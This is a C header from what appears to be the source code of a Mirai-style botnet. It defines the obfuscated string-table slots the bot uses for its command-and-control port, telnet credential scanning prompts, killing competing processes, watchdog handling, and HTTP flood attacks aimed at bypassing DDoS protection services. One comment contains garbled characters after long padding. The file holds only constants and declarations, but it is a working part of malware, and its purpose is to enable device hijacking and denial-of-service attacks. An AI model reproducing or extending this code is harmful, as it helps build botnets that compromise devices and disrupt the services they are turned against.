#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};
#define TABLE_CNC_PORT 1
#define TABLE_SCAN_CB_PORT 2
#define TABLE_EXEC_SUCCESS 3
#define TABLE_SCAN_SHELL 4
#define TABLE_SCAN_ENABLE 5
#define TABLE_SCAN_SYSTEM 6
#define TABLE_SCAN_SH 7
#define TABLE_SCAN_QUERY 8
#define TABLE_SCAN_RESP 9
#define TABLE_SCAN_NCORRECT 10
#define TABLE_SCAN_PS 11
#define TABLE_SCAN_KILL_9 12
#define TABLE_KILLER_PROC				13
#define TABLE_KILLER_EXE				14
#define TABLE_KILLER_FD					15
#define TABLE_KILLER_TCP				16
#define TABLE_MEM_ROUTE 17
#define nothing1 18
#define nothing2 19
#define TABLE_ATK_VSE 20
#define TABLE_ATK_RESOLVER 21
#define TABLE_ATK_NSERV 22
#define TABLE_ATK_KEEP_ALIVE            23
#define TABLE_ATK_ACCEPT                24
#define TABLE_ATK_ACCEPT_LNG            25 
#define TABLE_ATK_CONTENT_TYPE          26 
#define TABLE_ATK_SET_COOKIE            27
#define TABLE_ATK_REFRESH_HDR           28  
#define TABLE_ATK_LOCATION_HDR          29  
#define TABLE_ATK_SET_COOKIE_HDR        30  
#define TABLE_ATK_CONTENT_LENGTH_HDR    31  
#define TABLE_ATK_TRANSFER_ENCODING_HDR 32  
#define TABLE_ATK_CHUNKED               33  
#define TABLE_ATK_KEEP_ALIVE_HDR        34  
#define TABLE_ATK_CONNECTION_HDR        35  
#define TABLE_ATK_DOSARREST             36  
#define TABLE_ATK_CLOUDFLARE_NGINX      37  
#define TABLE_WATCHDOG_1 38
#define TABLE_WATCHDOG_2 39
#define TABLE_WATCHDOG_3 40
#define TABLE_WATCHDOG_4 41
#define TABLE_WATCHDOG_5 42
#define TABLE_WATCHDOG_6 43
#define TABLE_WATCHDOG_7 44
#define TABLE_WATCHDOG_8 45
#define TABLE_WATCHDOG_9 46
#define TABLE_SCAN_ASSWORD 47
#define TABLE_SCAN_OGIN 48
#define TABLE_SCAN_ENTER 49
#define TABLE_MISC_RAND 50

#define TABLE_MAX_KEYS 51

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);
//dont mess with 																																																																																																																				a..cc.r.ou
static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
